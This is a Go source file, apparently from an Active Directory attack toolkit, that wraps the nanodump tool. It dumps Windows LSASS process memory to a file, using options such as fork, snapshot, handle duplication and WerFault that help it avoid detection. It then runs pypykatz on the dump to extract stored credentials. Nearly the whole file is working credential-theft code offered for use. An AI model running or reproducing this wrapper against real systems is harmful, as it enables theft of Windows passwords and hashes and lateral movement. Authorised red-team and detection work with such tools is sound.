package tools

import (
	"adpack/utils"
	"fmt"
	"os"
	"path/filepath"
)

type nanodumpTool struct{}

var Nanodump = nanodumpTool{}

func (nanodumpTool) Name() string    { return "nanodump" }
func (nanodumpTool) Available() bool { return utils.ToolAvailable("nanodump") }

type NanodumpConfig struct {
	Binary string
	Output string
	Fork   bool
	Snapshot bool
	Dup    bool
	Werfault bool
}

func DefaultNanodumpConfig() NanodumpConfig {
	return NanodumpConfig{
		Binary: "nanodump",
		Output: fmt.Sprintf("lsass_%d.dmp", os.Getpid()),
	}
}

func (n nanodumpTool) Run(cfg NanodumpConfig) utils.CmdResult {
	args := []string{}
	if cfg.Output != "" {
		args = append(args, "--write", cfg.Output)
	}
	if cfg.Fork {
		args = append(args, "--fork")
	}
	if cfg.Snapshot {
		args = append(args, "--snapshot")
	}
	if cfg.Dup {
		args = append(args, "--dup")
	}
	if cfg.Werfault {
		args = append(args, "--werfault")
	}
	return utils.RunCommand(cfg.Binary, args...)
}

func (n nanodumpTool) DumpToFile(path string) utils.CmdResult {
	return n.Run(NanodumpConfig{Binary: "nanodump", Output: path, Fork: true})
}

func (n nanodumpTool) ParseDump(dmpPath string) (string, error) {
	absPath, err := filepath.Abs(dmpPath)
	if err != nil {
		return "", fmt.Errorf("nanodump: resolving dump path: %w", err)
	}
	if _, err := os.Stat(absPath); os.IsNotExist(err) {
		return "", fmt.Errorf("nanodump: dump not found: %s", absPath)
	}
	r := utils.RunCommand("pypykatz", "lsa", "minidump", absPath)
	if !r.Success {
		return "", fmt.Errorf("nanodump: pypykatz parse failed: %s", r.Stderr)
	}
	return r.Stdout, nil
}
